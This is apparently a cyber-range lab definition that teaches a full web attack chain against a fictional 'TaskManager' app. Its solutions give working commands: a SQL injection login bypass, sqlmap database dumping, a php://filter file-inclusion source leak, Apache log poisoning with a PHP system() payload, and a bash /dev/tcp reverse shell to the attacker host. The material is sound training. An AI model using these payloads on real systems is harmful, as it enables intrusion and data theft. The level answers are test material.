title: Web Application: SQLi → LFI → RCE
description: A full attack-chain web application penetration testing lab against a fictional internal app, "TaskManager". Trainees discover a hidden admin panel, bypass authentication with SQL injection, dump a database with sqlmap, escalate a local file inclusion into source disclosure, and finally chain log poisoning into remote code execution and a reverse shell.
prerequisites: Basic knowledge of the Linux command line
outcomes: Manual SQL injection to bypass authentication
Automated database enumeration and dumping with sqlmap
Escalating local file inclusion (LFI) to source code disclosure via PHP wrappers
Log poisoning to achieve remote code execution
Establishing and using a reverse shell to retrieve a final flag

levels.title: Introduction
levels.content:
# Web Application: SQLi → LFI → RCE

You've been hired to test **TaskManager**, an internal task-tracking web application. The public site at `http://172.16.0.10` looks harmless, but your client suspects there's more to it than a simple homepage.

Your goal: find the hidden admin panel, break into it, and see how far the chain of vulnerabilities takes you — all the way to a shell on the server.

## Topology

| Host | Role | IP |
| --- | --- | --- |
| attacker | Kali Linux | 172.16.0.100 |
| webserver | TaskManager (LAMP) | 172.16.0.10 |
| db-server | MySQL (internal only) | 172.16.0.20 |

`db-server` is **not** reachable directly from the attacker — only `webserver` can talk to it. Everything you learn about the database has to come through the web application.

## Disclaimer

This is a fictional, intentionally vulnerable application built for this training environment only. All techniques taught here must only ever be used against systems you are authorized to test.

levels.title: Get Access
levels.cloud_content:
Your first task is to access the sandbox. After you have successfully connected, submit the answer **`start`**.

### Sandbox access
1. In the topology overview on the right, right-click on **`attacker`** and then click on **`Open GUI`**.
2. Login with username **`user`** and password **`Password123`**.
3. `webserver` (172.16.0.10) and `db-server` (172.16.0.20) are reachable from `attacker` over the internal network.
levels.local_content: This sandbox has not been tested for use with local sandbox.

levels.title: Level 1: Directory Discovery
levels.content:
The public TaskManager homepage doesn't link to any admin interface. Use content discovery to find it.

As a flag, submit the **path of the hidden admin directory**, in the format `/directory_name`.
levels.solution:
```
user@attacker:~$ gobuster dir -u http://172.16.0.10 -w /usr/share/dirb/wordlists/common.txt -x php,txt
```
Among the noise of 404s, one path stands out with a 200/301 response instead of the expected 404.

The flag is: ${ANSWER}

hints.title: Which tool should I use?
hints.content: Use **gobuster** (or ffuf/dirb) with a common directory wordlist against the webserver.

levels.title: Level 2: SQL Injection Auth Bypass
levels.content:
The admin panel's login form builds its SQL query by directly concatenating your input:
```
SELECT * FROM users WHERE user='$u' AND pass='$p'
```
Bypass the login without knowing any valid password, then check the dashboard to see which account you're actually logged in as.

As a flag, submit the **username shown on the dashboard** after the bypass.
levels.solution:
In the login form, submit:
- Username: `' OR 1=1-- -`
- Password: (anything)

This turns the query into `SELECT * FROM users WHERE user='' OR 1=1-- -' AND pass='...'`, which matches every row in the table. The application logs you in as the first matching user and shows their username on the dashboard.

The flag is: ${ANSWER}

hints.title: What does the query look like?
hints.content: The query is `SELECT * FROM users WHERE user='$u' AND pass='$p'` with no sanitization. Think about how to make the `WHERE` clause always true.

hints.title: What payload should I try?
hints.content: A classic payload for this pattern is `' OR 1=1-- -` in the username field.

levels.title: Level 3: Database Dump with sqlmap
levels.content:
Manual injection got you in, but now you want to fully enumerate the database. Automate it with **sqlmap** against the login form.

As a flag, submit the value of the **`api_key`** column in the **`secrets`** table.
levels.solution:
```
user@attacker:~$ sqlmap -u "http://172.16.0.10/admin_portal_v2/login.php" --data "user=admin&pass=x" -p user --batch --dbs
user@attacker:~$ sqlmap -u "http://172.16.0.10/admin_portal_v2/login.php" --data "user=admin&pass=x" -p user --batch -D taskmanager --tables
user@attacker:~$ sqlmap -u "http://172.16.0.10/admin_portal_v2/login.php" --data "user=admin&pass=x" -p user --batch -D taskmanager -T secrets --dump
```

The flag is: ${ANSWER}

hints.title: Which parameter is injectable?
hints.content: The `user` POST parameter of `login.php` is injectable — tell sqlmap with `-p user`.

hints.title: What's the sqlmap workflow?
hints.content: First enumerate databases with `--dbs`, then tables in the relevant database with `--tables`, then dump the specific table with `--dump -T secrets`.

levels.title: Level 4: LFI with PHP Wrapper
levels.content:
The dashboard's `?page=` parameter loads local PHP files (`dashboard.php?page=tasks.php`, etc.), and it doesn't validate the value beyond stripping `../`. You can't browse to `config.php` directly and read its source — the server just executes it and shows a blank page.

Use a PHP stream wrapper to make the server hand you the **source code** instead of executing it.

As a flag, submit the value of the **`DB_PASS`** constant defined in `config.php`.
levels.solution:
```
user@attacker:~$ curl -s -b "PHPSESSID=<your_session_cookie>" "http://172.16.0.10/admin_portal_v2/dashboard.php?page=php://filter/convert.base64-encode/resource=config.php" | grep -A2 content
```
Copy the base64 blob out of the page and decode it:
```
user@attacker:~$ echo '<base64_blob>' | base64 -d
```
The decoded PHP source contains the `DB_PASS` constant.

The flag is: ${ANSWER}

hints.title: Why can't I just request page=config.php?
hints.content: Requesting `config.php` directly makes PHP *execute* it — you'd only see whatever it prints (nothing), not its source code.

hints.title: Which PHP wrapper leaks source code?
hints.content: Use the `php://filter` wrapper with the `convert.base64-encode` filter, targeting `resource=config.php`. The response will contain base64 text instead of executing the file — decode it locally.

hints.title: Do I need to be logged in?
hints.content: Yes — `dashboard.php` checks for a valid session, so make sure to reuse the session cookie from your Level 2 login (or pass credentials with `curl -c`/`-b`).

levels.title: Level 5: Log Poisoning to RCE
levels.content:
The same LFI can include *any* file the web server process can read — including its own Apache access log. Every request's `User-Agent` header gets written into that log verbatim. If you put PHP code in your `User-Agent`, including the log file will execute it.

As a flag, submit the contents of **`/etc/hostname`** on the webserver.
levels.solution:
Step 1 — poison the log with a PHP payload in the User-Agent header:
```
user@attacker:~$ curl -s -b "PHPSESSID=<your_session_cookie>" -A "<?php system(\$_GET['cmd']); ?>" http://172.16.0.10/
```
Step 2 — include the poisoned log file and pass a command via `cmd`:
```
user@attacker:~$ curl -s -b "PHPSESSID=<your_session_cookie>" "http://172.16.0.10/admin_portal_v2/dashboard.php?page=/var/log/apache2/access.log&cmd=cat+/etc/hostname"
```
The log file gets `include()`'d, PHP parses your injected `<?php ... ?>` tag as real code, and `system()` runs your command.

The flag is: ${ANSWER}

hints.title: Where does my User-Agent end up?
hints.content: Apache logs every request's `User-Agent` header verbatim into `access.log`. If that string contains valid PHP tags, and the log file later gets `include()`'d, PHP will execute it.

hints.title: What payload should I send as User-Agent?
hints.content: Something like `<?php system($_GET['cmd']); ?>` — with curl, use `-A "<payload>"`.

hints.title: How do I trigger it?
hints.content: Include the log file via the same LFI parameter used in Level 4: `?page=/var/log/apache2/access.log`, then add `&cmd=<your command>` to run something through the injected `system()` call.

levels.title: Level 6: Reverse Shell + Loot
levels.content:
One-off commands are useful, but a full interactive shell is much more powerful. Use the RCE from Level 5 to pop a reverse shell back to your attacker machine, then loot a hidden file.

As a flag, submit the contents of **`/var/www/html/admin_portal_v2/.secret_vault/crown.txt`**.
levels.solution:
Step 1 — start a listener on Kali:
```
user@attacker:~$ nc -lvnp 4444
```
Step 2 — trigger a reverse shell through the same log-poisoning RCE, replacing `kali_ip` with your attacker's IP (172.16.0.100):
```
user@attacker:~$ curl -s -b "PHPSESSID=<your_session_cookie>" "http://172.16.0.10/admin_portal_v2/dashboard.php?page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.16.0.100/4444+0>%261'"
```
Step 3 — once you catch the shell, read the loot file:
```
www-data@webserver:~$ cat /var/www/html/admin_portal_v2/.secret_vault/crown.txt
```

The flag is: ${ANSWER}

hints.title: What do I set up first?
hints.content: Start a netcat listener on your attacker machine before triggering anything: `nc -lvnp 4444`.

hints.title: How do I get a shell back, not just command output?
hints.content: Send a bash reverse shell one-liner as the `cmd` value through the same RCE from Level 5, pointing at your attacker's IP and listening port.

hints.title: Where's the final loot?
hints.content: Once you have a shell as `www-data`, look inside the hidden `.secret_vault` directory under the admin panel's web root.

levels.title: Epilogue
levels.content:
Full chain complete: **content discovery → SQL injection → automated database dumping → LFI source disclosure → log poisoning → remote code execution → reverse shell**.

Every step exploited a small, realistic mistake: an undocumented admin path, string-concatenated SQL, an LFI parameter with no allowlist, and an Apache log file that's both attacker-writable (via User-Agent) and web-server-readable. None of these bugs is exotic — that's exactly why chains like this show up so often in real assessments.

**Scenario design**: original lab content created for this CyberRangeCZ training deck.
